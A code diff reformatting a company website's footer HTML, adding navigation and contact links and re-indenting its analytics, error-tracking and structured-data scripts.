+            <a href="#" class="social-link" aria-label="ASDAC on LinkedIn"
+              >💼</a
+            >
+            <a href="#" class="social-link" aria-label="ASDAC on GitHub">💻</a>
+          </div>
         </div>
 
-        <div class="footer-bottom">
-            <p class="copyright">
-                &copy; <span id="current-year"></span> ASDAC. All rights reserved.
-            </p>
+        <nav class="footer-nav" aria-labelledby="footer-nav-heading">
+          <h3 id="footer-nav-heading" class="footer-heading">Explore</h3>
+          <ul class="footer-links">
+            <li><a href="#about">About Us</a></li>
+            <li><a href="#features">Our Approach</a></li>
+            <li><a href="#team">Our Team</a></li>
+            <li><a href="#coming-soon">Coming Soon</a></li>
+          </ul>
+        </nav>
+
+        <div class="footer-contact">
+          <h3 class="footer-heading">Contact</h3>
+          <ul class="footer-links">
+            <li><a href="mailto:hello@asdac.com">hello@asdac.co.uk</a></li>
+
+            <li style="display: none">
+              <address>123 Innovation Street<br />London, UK</address>
+            </li>
+          </ul>
         </div>
+      </div>
+
+      <div class="footer-bottom">
+        <p class="copyright">
+          &copy; <span id="current-year"></span> ASDAC. All rights reserved.
+        </p>
+      </div>
     </footer>
 
     <script src="scripts.min.js" defer></script>
     <!-- GoatCounter Analytics -->
-    <script data-goatcounter="https://asdac.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+    <script
+      data-goatcounter="https://asdac.goatcounter.com/count"
+      async
+      src="//gc.zgo.at/count.js"
+    ></script>
     <!-- Sentry Error Tracking -->
-    <script src="https://js-de.sentry-cdn.com/0e0363708db3e54fbc55722e0abca258.min.js" crossorigin="anonymous"></script>
+    <script
+      src="https://js-de.sentry-cdn.com/0e0363708db3e54fbc55722e0abca258.min.js"
+      crossorigin="anonymous"
+    ></script>
     <script src="https://cdn.jsdelivr.net/npm/three@0.153.0/build/three.min.js"></script>
     <script src="hero-bg.js" defer></script>
     <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "Organization",
-      "name": "ASDAC",
-      "url": "https://www.asdac.co.uk",
-      "logo": "https://www.asdac.co.uk/assets/images/og-image.png",
-      "description": "ASDAC creates beautiful apps designed to simplify your routine and bring joy to everyday moments through thoughtful technology.",
-      "contactPoint": [{
-        "@type": "ContactPoint",
-        "email": "hello@asdac.co.uk",
-        "contactType": "customer support"
-      }]
-    }
+      {
+        "@context": "https://schema.org",
+        "@type": "Organization",
+        "name": "ASDAC",
+        "url": "https://www.asdac.co.uk",
+        "logo": "https://www.asdac.co.uk/assets/images/og-image.png",
+        "description": "ASDAC creates beautiful apps designed to simplify your routine and bring joy to everyday moments through thoughtful technology.",
+        "contactPoint": [
+          {
+            "@type": "ContactPoint",
+            "email": "hello@asdac.co.uk",
+            "contactType": "customer support"
+          }
+        ]
+      }
     </script>
-</body>
+  </body>
 </html>
